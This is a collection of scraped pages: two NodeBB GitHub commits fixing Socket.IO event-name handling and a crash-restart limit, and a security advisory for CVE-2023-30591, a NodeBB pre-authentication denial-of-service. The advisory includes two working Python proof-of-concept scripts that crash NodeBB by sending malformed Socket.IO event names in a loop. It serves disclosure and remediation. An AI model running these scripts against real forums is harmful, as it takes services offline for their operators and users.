=== Content from github.com_3f41a501_20250111_071151.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNodeBB%2FNodeBB%2Fcommit%2F830f142b7aea2e597294a84d52c05aab3a3539ca)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNodeBB%2FNodeBB%2Fcommit%2F830f142b7aea2e597294a84d52c05aab3a3539ca)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=NodeBB%2FNodeBB)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[NodeBB](/NodeBB)
/
**[NodeBB](/NodeBB/NodeBB)**
Public

* [Notifications](/login?return_to=%2FNodeBB%2FNodeBB) You must be signed in to change notification settings
* [Fork
  2.8k](/login?return_to=%2FNodeBB%2FNodeBB)
* [Star
   14.3k](/login?return_to=%2FNodeBB%2FNodeBB)

* [Code](/NodeBB/NodeBB)
* [Issues
  152](/NodeBB/NodeBB/issues)
* [Pull requests
  32](/NodeBB/NodeBB/pulls)
* [Actions](/NodeBB/NodeBB/actions)
* [Projects
  1](/NodeBB/NodeBB/projects)
* [Wiki](/NodeBB/NodeBB/wiki)
* [Security](/NodeBB/NodeBB/security)
* [Insights](/NodeBB/NodeBB/pulse)

Additional navigation options

* [Code](/NodeBB/NodeBB)
* [Issues](/NodeBB/NodeBB/issues)
* [Pull requests](/NodeBB/NodeBB/pulls)
* [Actions](/NodeBB/NodeBB/actions)
* [Projects](/NodeBB/NodeBB/projects)
* [Wiki](/NodeBB/NodeBB/wiki)
* [Security](/NodeBB/NodeBB/security)
* [Insights](/NodeBB/NodeBB/pulse)

## Commit

[Permalink](/NodeBB/NodeBB/commit/830f142b7aea2e597294a84d52c05aab3a3539ca)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

fix: [#11403](https://github.com/NodeBB/NodeBB/issues/11403), remove loader.js crash counter logic

[Browse files](/NodeBB/NodeBB/tree/830f142b7aea2e597294a84d52c05aab3a3539ca)
Browse the repository at this point in the history

* Loading branch information

[![@julianlam](https://avatars.githubusercontent.com/u/923011?s=40&v=4)](/julianlam)

[julianlam](/NodeBB/NodeBB/commits?author=julianlam "View all commits by julianlam")
committed
Mar 27, 2023

1 parent
[1aff9ca](/NodeBB/NodeBB/commit/1aff9cad91d516f2360ec265f381a22ee8178d17)

commit 830f142

Showing
**1 changed file**
with
**1 addition**
and
**18 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

19 changes: 1 addition & 18 deletions

19
[loader.js](#diff-b145014157c33a34f943e62cc905f02d006592550d24d244c78564e45380842a "loader.js")

Show comments

[View file](/NodeBB/NodeBB/blob/830f142b7aea2e597294a84d52c05aab3a3539ca/loader.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -30,9 +30,7 @@ const output = logrotate({ file: outputLogFilePath, size: '1m', keep: 3, compres |
|  |  | const silent = nconf.get('silent') === 'false' ? false : nconf.get('silent') !== false; |
|  |  | let numProcs; |
|  |  | const workers = []; |
|  |  | const Loader = { |
|  |  | timesStarted: 0, |
|  |  | }; |
|  |  | const Loader = {}; |
|  |  | const appPath = path.join(\_\_dirname, 'app.js'); |
|  |  |  |
|  |  | Loader.init = function () { |
| Expand All | | @@ -57,21 +55,6 @@ Loader.displayStartupMessages = function () { |
|  |  |  |
|  |  | Loader.addWorkerEvents = function (worker) { |
|  |  | worker.on('exit', (code, signal) => { |
|  |  | if (code !== 0) { |
|  |  | if (Loader.timesStarted < numProcs \* 3) { |
|  |  | Loader.timesStarted += 1; |
|  |  | if (Loader.crashTimer) { |
|  |  | clearTimeout(Loader.crashTimer); |
|  |  | } |
|  |  | Loader.crashTimer = setTimeout(() => { |
|  |  | Loader.timesStarted = 0; |
|  |  | }, 10000); |
|  |  | } else { |
|  |  | console.log(`${numProcs \* 3} restarts in 10 seconds, most likely an error on startup. Halting.`); |
|  |  | process.exit(); |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | console.log(`[cluster] Child Process (${worker.pid}) has exited (code: ${code}, signal: ${signal})`); |
|  |  | if (!(worker.suicide || code === 0)) { |
|  |  | console.log('[cluster] Spinning up another process...'); |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `830f142`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNodeBB%2FNodeBB%2Fcommit%2F830f142b7aea2e597294a84d52c05aab3a3539ca) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_e2c35d15_20250111_071151.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNodeBB%2FNodeBB%2Fcommit%2F4d2d76897a02e7068ab74c81d17a2febfae8bfb9)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNodeBB%2FNodeBB%2Fcommit%2F4d2d76897a02e7068ab74c81d17a2febfae8bfb9)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=NodeBB%2FNodeBB)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[NodeBB](/NodeBB)
/
**[NodeBB](/NodeBB/NodeBB)**
Public

* [Notifications](/login?return_to=%2FNodeBB%2FNodeBB) You must be signed in to change notification settings
* [Fork
  2.8k](/login?return_to=%2FNodeBB%2FNodeBB)
* [Star
   14.3k](/login?return_to=%2FNodeBB%2FNodeBB)

* [Code](/NodeBB/NodeBB)
* [Issues
  152](/NodeBB/NodeBB/issues)
* [Pull requests
  32](/NodeBB/NodeBB/pulls)
* [Actions](/NodeBB/NodeBB/actions)
* [Projects
  1](/NodeBB/NodeBB/projects)
* [Wiki](/NodeBB/NodeBB/wiki)
* [Security](/NodeBB/NodeBB/security)
* [Insights](/NodeBB/NodeBB/pulse)

Additional navigation options

* [Code](/NodeBB/NodeBB)
* [Issues](/NodeBB/NodeBB/issues)
* [Pull requests](/NodeBB/NodeBB/pulls)
* [Actions](/NodeBB/NodeBB/actions)
* [Projects](/NodeBB/NodeBB/projects)
* [Wiki](/NodeBB/NodeBB/wiki)
* [Security](/NodeBB/NodeBB/security)
* [Insights](/NodeBB/NodeBB/pulse)

## Commit

[Permalink](/NodeBB/NodeBB/commit/4d2d76897a02e7068ab74c81d17a2febfae8bfb9)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

fix: don't crash on objects with toString property

[Browse files](/NodeBB/NodeBB/tree/4d2d76897a02e7068ab74c81d17a2febfae8bfb9)
Browse the repository at this point in the history

* Loading branch information

[![@barisusakli](https://avatars.githubusercontent.com/u/2583394?s=40&v=4)](/barisusakli)

[barisusakli](/NodeBB/NodeBB/commits?author=barisusakli "View all commits by barisusakli")
committed
Mar 28, 2023

1 parent
[7397873](/NodeBB/NodeBB/commit/7397873db355d5449e9de3e6ca39b47b4cb34813)

commit 4d2d768

Showing
**1 changed file**
with
**33 additions**
and
**32 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

65 changes: 33 additions & 32 deletions

65
[src/socket.io/index.js](#diff-b80b656e3a5aab4f2f91937701c22e8fa18cc98ee7515a225114605113a94004 "src/socket.io/index.js")

Show comments

[View file](/NodeBB/NodeBB/blob/4d2d76897a02e7068ab74c81d17a2febfae8bfb9/src/socket.io/index.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -112,48 +112,49 @@ async function onMessage(socket, payload) { |
|  |  | return winston.warn('[socket.io] Empty payload'); |
|  |  | } |
|  |  |  |
|  |  | const eventName = payload.data[0]; |
|  |  | let eventName = payload.data[0]; |
|  |  | const params = typeof payload.data[1] === 'function' ? {} : payload.data[1]; |
|  |  | const callback = typeof payload.data[payload.data.length - 1] === 'function' ? payload.data[payload.data.length - 1] : function () {}; |
|  |  |  |
|  |  | if (!eventName) { |
|  |  | return winston.warn('[socket.io] Empty method name'); |
|  |  | } |
|  |  |  |
|  |  | if (typeof eventName !== 'string') { |
|  |  | const escapedName = validator.escape(String(eventName)); |
|  |  | return callback({ message: `[[error:invalid-event, ${escapedName}]]` }); |
|  |  | } |
|  |  | try { |
|  |  | if (!eventName) { |
|  |  | return winston.warn('[socket.io] Empty method name'); |
|  |  | } |
|  |  |  |
|  |  | const parts = eventName.split('.'); |
|  |  | const namespace = parts[0]; |
|  |  | const methodToCall = parts.reduce((prev, cur) => { |
|  |  | if (prev !== null && prev[cur] && (!prev.hasOwnProperty || prev.hasOwnProperty(cur))) { |
|  |  | return prev[cur]; |
|  |  | if (typeof eventName !== 'string') { |
|  |  | eventName = typeof eventName; |
|  |  | const escapedName = validator.escape(eventName); |
|  |  | return callback({ message: `[[error:invalid-event, ${escapedName}]]` }); |
|  |  | } |
|  |  | return null; |
|  |  | }, Namespaces); |
|  |  |  |
|  |  | if (!methodToCall || typeof methodToCall !== 'function') { |
|  |  | if (process.env.NODE\_ENV === 'development') { |
|  |  | winston.warn(`[socket.io] Unrecognized message: ${eventName}`); |
|  |  | const parts = eventName.split('.'); |
|  |  | const namespace = parts[0]; |
|  |  | const methodToCall = parts.reduce((prev, cur) => { |
|  |  | if (prev !== null && prev[cur] && (!prev.hasOwnProperty || prev.hasOwnProperty(cur))) { |
|  |  | return prev[cur]; |
|  |  | } |
|  |  | return null; |
|  |  | }, Namespaces); |
|  |  |  |
|  |  | if (!methodToCall || typeof methodToCall !== 'function') { |
|  |  | if (process.env.NODE\_ENV === 'development') { |
|  |  | winston.warn(`[socket.io] Unrecognized message: ${eventName}`); |
|  |  | } |
|  |  | const escapedName = validator.escape(String(eventName)); |
|  |  | return callback({ message: `[[error:invalid-event, ${escapedName}]]` }); |
|  |  | } |
|  |  | const escapedName = validator.escape(String(eventName)); |
|  |  | return callback({ message: `[[error:invalid-event, ${escapedName}]]` }); |
|  |  | } |
|  |  |  |
|  |  | socket.previousEvents = socket.previousEvents || []; |
|  |  | socket.previousEvents.push(eventName); |
|  |  | if (socket.previousEvents.length > 20) { |
|  |  | socket.previousEvents.shift(); |
|  |  | } |
|  |  | socket.previousEvents = socket.previousEvents || []; |
|  |  | socket.previousEvents.push(eventName); |
|  |  | if (socket.previousEvents.length > 20) { |
|  |  | socket.previousEvents.shift(); |
|  |  | } |
|  |  |  |
|  |  | if (!eventName.startsWith('admin.') && ratelimit.isFlooding(socket)) { |
|  |  | winston.warn(`[socket.io] Too many emits! Disconnecting uid : ${socket.uid}. Events : ${socket.previousEvents}`); |
|  |  | return socket.disconnect(); |
|  |  | } |
|  |  | if (!eventName.startsWith('admin.') && ratelimit.isFlooding(socket)) { |
|  |  | winston.warn(`[socket.io] Too many emits! Disconnecting uid : ${socket.uid}. Events : ${socket.previousEvents}`); |
|  |  | return socket.disconnect(); |
|  |  | } |
|  |  |  |
|  |  | try { |
|  |  | await checkMaintenance(socket); |
|  |  | await validateSession(socket, '[[error:revalidate-failure]]'); |
|  |  |  |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `4d2d768`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNodeBB%2FNodeBB%2Fcommit%2F4d2d76897a02e7068ab74c81d17a2febfae8bfb9) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from starlabs.sg_4a4bb52c_20250111_071152.html ===

[![logo](https://starlabs.sg/logo-white.png)](https://starlabs.sg/ "  (Alt + H)")

* [Home](https://starlabs.sg/ "Home")
* [About](https://starlabs.sg/about/ "About")
* [Advisories](https://starlabs.sg/advisories/ "Advisories")
* [Blog](https://starlabs.sg/blog/ "Blog")
* [Achievements](https://starlabs.sg/achievements/ "Achievements")
* [Publications](https://starlabs.sg/publications/ "Publications")
* [Search](https://starlabs.sg/search/ "Search (Alt + /)")

[Home](https://starlabs.sg/) » [Advisories](https://starlabs.sg/advisories/)
# (CVE-2023-30591) NodeBB Pre-Authentication Denial-of-Service

September 29, 2023 · 8 min · Ngo Wei Lin (@Creastery)

Table of Contents

* [Summary:](#summary)
* [CVSS3.1 Scoring System:](#cvss31-scoring-system)
* [Product Overview:](#product-overview)
* [Vulnerability Summary:](#vulnerability-summary)
* [Vulnerability Details:](#vulnerability-details)
  + [Crashing NodeBB Workers:](#crashing-nodebb-workers)
  + [Crashing NodeBB Cluster Manager:](#crashing-nodebb-cluster-manager)
* [Exploit Conditions:](#exploit-conditions)
* [Reproduction Steps:](#reproduction-steps)
  + [Proof-of-Concept #1: DoS via Array Type for Socket.IO Event Name](#proof-of-concept-1-dos-via-array-type-for-socketio-event-name)
  + [Proof-of-Concept #2: DoS via Object Type for Socket.IO Event Name](#proof-of-concept-2-dos-via-object-type-for-socketio-event-name)
* [Suggested Mitigations:](#suggested-mitigations)
* [Detection Guidance:](#detection-guidance)
* [Credits:](#credits)
* [Timeline:](#timeline)

## Summary:[#](#summary)

| **Product** | NodeBB |
| --- | --- |
| **Vendor** | NodeBB |
| **Severity** | High - Unprivileged attackers are able to cause NodeBB to crash and exit permanently |
| **Affected Versions** | < [v2.8.11](https://github.com/NodeBB/NodeBB/tree/v2.8.11) (Commit [82f0efb](https://github.com/NodeBB/NodeBB/commit/82f0efb14b466998edb52fd8f10582508e958173)) |
| **Tested Versions** | [v2.8.9](https://github.com/NodeBB/NodeBB/tree/v2.8.9) (Commit [fb100ac](https://github.com/NodeBB/NodeBB/commit/fb100ac73128aa6b06efa9fd6738466fc674aa1b)) |
| **CVE Identifier** | CVE-2023-30591 |
| **CVE Description** | Denial-of-service in NodeBB <= v2.8.10 allows unauthenticated attackers to trigger a crash, when invoking `eventName.startsWith()` or `eventName.toString()`, while processing Socket.IO messages via crafted Socket.IO messages containing array or object type for the event name respectively. |
| **CWE Classification(s)** | CWE-241: Improper Handling of Unexpected Data Type |
| **CAPEC Classification(s)** | CAPEC-153: Input Data Manipulation |

## CVSS3.1 Scoring System:[#](#cvss31-scoring-system)

**Base Score:** 7.5 (High)

**Vector String:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`

| **Metric** | **Value** |
| --- | --- |
| **Attack Vector (AV)** | Network |
| **Attack Complexity (AC)** | Low |
| **Privileges Required (PR)** | None |
| **User Interaction (UI)** | None |
| **Scope (S)** | Unchanged |
| **Confidentiality (C)** | None |
| **Integrity (I)** | None |
| **Availability (A)** | High |

## Product Overview:[#](#product-overview)

NodeBB is an open-source community forum platform built on Node.js with the addition of either a Redis, MongoDB, or PostgreSQL database. One of the features of the platform is the utilization of [Socket.IO](https://socket.io) for instant interactions and real-time notifications.

## Vulnerability Summary:[#](#vulnerability-summary)

Due to improper parsing and handling of unexpected payloads supplied in Socket.IO messages, an unauthenticated attacker is able to send a malicious Socket.IO message to cause a NodeBB worker instance to crash. Although NodeBB’s cluster manager attempts to spawn a new replacement worker, it is possible to cause the NodeBB cluster manager to terminate after crashing NodeBB workers multiple times within a short span of time.

The vulnerability can be exploited by using an array as the Socket.IO event name to trigger a crash when invoking `eventName.startsWith()`, or by using an object as the Socket.IO event name, and setting the `toString` property, to trigger a crash when invoking `eventName.toString()`.

## Vulnerability Details:[#](#vulnerability-details)

NodeBB uses the [Socket.IO](https://socket.io/) library for enable bidirectional, event-based communication between clients and the server. Socket.IO typically uses WebSocket for communication, but supports HTTP long-polling as a fallback.

### Crashing NodeBB Workers:[#](#crashing-nodebb-workers)

The vulnerability can be found in the Socket.IO message handler implemented in [`/src/socket.io/index.js`](https://github.com/NodeBB/NodeBB/blob/v2.8.9/src/socket.io/index.js):

```
function onConnection(socket) {
    ...
	socket.onAny((event, ...args) => {
		const payload = { data: [event].concat(args) };
		const als = require('../als');
		als.run({ uid: socket.uid }, onMessage, socket, payload); // [1]
	});
    ...
}
async function onMessage(socket, payload) {
	...
	const eventName = payload.data[0]; // [2]
	...
	const parts = eventName.toString().split('.'); // [3]
	const namespace = parts[0];
	const methodToCall = parts.reduce((prev, cur) => { // [4]
		if (prev !== null && prev[cur] && (!prev.hasOwnProperty || prev.hasOwnProperty(cur))) {
			return prev[cur];
		}
		return null;
	}, Namespaces);
    if (!methodToCall || typeof methodToCall !== 'function') { // [5]
		...
		return callback({ message: `[[error:invalid-event, ${escapedName}]]` }); // [6]
	}

	if (!eventName.startsWith('admin.') && ratelimit.isFlooding(socket)) { // [7]
		winston.warn(`[socket.io] Too many emits! Disconnecting uid : ${socket.uid}. Events : ${socket.previousEvents}`);
		return socket.disconnect();
	}
	...
}

```

At [1], the `onMessage()` callback function is invoked with the `payload` object containing the `event` name and the `args` arguments received. Observe that no type validation or coercion is performed on `eventName`, and the `eventName` is assumed to be of `String` type.

At [2], the event name (e.g. `topics.loadMoreTags`) is extracted from the `payload` object.

At [3], the event name is converted to its string representation before splitting it into multiple parts. Subsequently, the `Namespaces` object is traversed to get a reference of the event handler to be invoked and assigning it to `methodToCall` at [4].

At [5], if `methodToCall` is not a function, an error will be returned at [6].

At [7], `eventName.startsWith('admin.')` is invoked. However, if `eventName` is not a `String` type, then `eventName.startsWith('admin.')` throws a `TypeError` as `eventName.startsWith` is `undefined`.

Interestingly, any data type may be used when supplying the event name in the Socket.IO message due to the following reasons:

* Socket.IO uses `JSON.parse()` to parse the user-supplied event name in the Socket.IO message. However, Socket.IO does not perform any validation on the event name, and assumes that the event name supplied by the user is of `String` type.
* `Socket` objects in Socket.IO effectively extends from Node.js’ `EventEmitter` class, so most exposed API functions of Socket.IO socket objects rely on the implementation of `EventEmitter`.
* The documentation for Node.js’s `EventEmitter` suggests that event names should either be of `String` or `Symbol` type, but no type validation check is performed on the event name.
* When storing event listeners (e.g. via `emitter.on()`) or looking up event listeners (e.g. via `emitter.emit()`), the event name supplied as argument is implicitly casted to `String` type.
* However, the original event name supplied as argument is passed to the event listener without type-casting.
* This results in user-supplied event names, which may be non-string values, within Socket.IO messages to be passed directly to event listeners.

To avoid the early termination at [6] and preventing the condition at [5] from returning `true`, while still causing a `TypeError` to be thrown at [7], an array with a single element can be used to supply the event name:

```
> const eventName = ["topics.loadMoreTags"];
> ["topics.loadMoreTags"].toString()
"topics.loadMoreTags"
> const parts = eventName.toString().split('.'); // [3]
["topics", "loadMoreTags"]
> eventName.startsWith // at [7]
undefined

```

Similarly, it is also possible to cause an uncaught exception earlier when invoking `eventName.toString()` at [3] by supplying an object with the `toString` property defined:

```
> const eventName = {"toString": 1};
> eventName.toString()
// TypeError

```
### Crashing NodeBB Cluster Manager:[#](#crashing-nodebb-cluster-manager)

In [`/loader.js`](https://github.com/NodeBB/NodeBB/blob/v2.8.9/loader.js#L71), the cluster manager attempts to restart the workers which exited abnormally:

```
Loader.addWorkerEvents = function (worker) {
	worker.on('exit', (code, signal) => {
		if (code !== 0) {
			if (Loader.timesStarted < numProcs * 3) {
				Loader.timesStarted += 1;
				if (Loader.crashTimer) {
					clearTimeout(Loader.crashTimer);
				}
				Loader.crashTimer = setTimeout(() => {
					Loader.timesStarted = 0;
				}, 10000);
			} else {
				console.log(`${numProcs * 3} restarts in 10 seconds, most likely an error on startup. Halting.`);
				process.exit(); // [8]
			}
		}
		console.log(`[cluster] Child Process (${worker.pid}) has exited (code: ${code}, signal: ${signal})`);
		if (!(worker.suicide || code === 0)) {
			console.log('[cluster] Spinning up another process...');
			forkWorker(worker.index, worker.isPrimary);
		}
	});
    ...
}

```

Finally, at [8], if too many workers exited abnormally within the hard-coded 10 seconds threshold, the cluster manager concludes that a startup error had occurred and will terminate itself as well, killing all NodeBB workers.

Since an attacker can cause NodeBB workers to exit abruptly at will, this enables the attacker to terminate NodeBB completely, causing persistent denial-of-service.

## Exploit Conditions:[#](#exploit-conditions)

No additional constraints were identified. An unauthenticated attacker is expected to be able to execute this exploit scenario reliably.

## Reproduction Steps:[#](#reproduction-steps)

### Proof-of-Concept #1: DoS via Array Type for Socket.IO Event Name[#](#proof-of-concept-1-dos-via-array-type-for-socketio-event-name)

1. Install Socket.IO client for Python using: `pip install "python-socketio[client]"`.
2. Save the following proof-of-concept exploit script as `dos-via-array.py`:
   ```
   #!/usr/bin/env python3
   import socketio
   import sys
   from time import sleep
   delay = 0.5 # in seconds
   def dos(target):
       sio = socketio.Client()
       sio.connect(f'{target}/socket.io')
       sio.emit(["topics.loadMoreTags"], {}) # reference any valid event handler within Namespaces
   def main(target):
       while True:
           try:
               dos(target)
           except KeyboardInterrupt:
               sys.exit(0)
           except:
               pass
           sleep(delay)
   if __name__ == '__main__':
       target = 'http://localhost:4567' if len(sys.argv) < 1 else sys.argv[1]
       main(target)

   ```
3. Ensure that NodeBB is started using `./nodebb start`.
4. Run the exploit script using `python3 dos-via-array.py http://<target-nodebb>:<port>`.
5. Observe that after a few seconds, NodeBB terminates with the following message observed in the output logs:
   ```
   3 restarts in 10 seconds, most likely an error on startup. Halting.

   ```

### Proof-of-Concept #2: DoS via Object Type for Socket.IO Event Name[#](#proof-of-concept-2-dos-via-object-type-for-socketio-event-name)

1. Install Socket.IO client for Python using: `pip install "python-socketio[client]"`
2. Save the following proof-of-concept exploit script as `dos-via-object.py`:
   ```
   #!/usr/bin/env python3
   import socketio
   import sys
   from time import sleep
   delay = 0.5 # in seconds
   def dos(target):
       sio = socketio.Client()
       sio.connect(f'{target}/socket.io')
       sio.emit({"toString":0}, {}) # any object setting toString property
   def main(target):
       while True:
           try:
               dos(target)
           except KeyboardInterrupt:
               sys.exit(0)
           except:
               pass
           sleep(delay)
   if __name__ == '__main__':
       target = 'http://localhost:4567' if len(sys.argv) < 1 else sys.argv[1]
       main(target)

   ```
3. Ensure that NodeBB is started using `./nodebb start`.
4. Run the exploit script using `python3 dos-via-object.py http://<target-nodebb>:<port>`.
5. Observe that after a few seconds, NodeBB terminates with the following message observed in the output logs:
   ```
   3 restarts in 10 seconds, most likely an error on startup. Halting.

   ```

## Suggested Mitigations:[#](#suggested-mitigations)

Implement a validation check to ensure that `eventName` is of `String` type before processing the message received. For example:

```
async function onMessage(socket, payload) {
	...
+   if (typeof payload.data[0] !== "string") {
+       winston.warn('[socket.io] Non-string event name');
+       return socket.disconnect();
+   }
    const eventName = payload.data[0];
    ...
}

```

It is also recommended to implement additional error handling to further prevent uncaught exceptions from crashing the NodeBB worker. For example:

```
function onConnection(socket) {
    ...
    socket.onAny((event, ...args) => {
        const payload = { data: [event].concat(args) };
        const als = require('../als');
-       als.run({ uid: socket.uid }, onMessage, socket, payload);
+       try {
+           als.run({ uid: socket.uid }, onMessage, socket, payload);
+       } catch (err) {
+           winston.error(`${event}\n${err.stack ? err.stack : err.message}`);
+           socket.disconnect();
+       }
    });
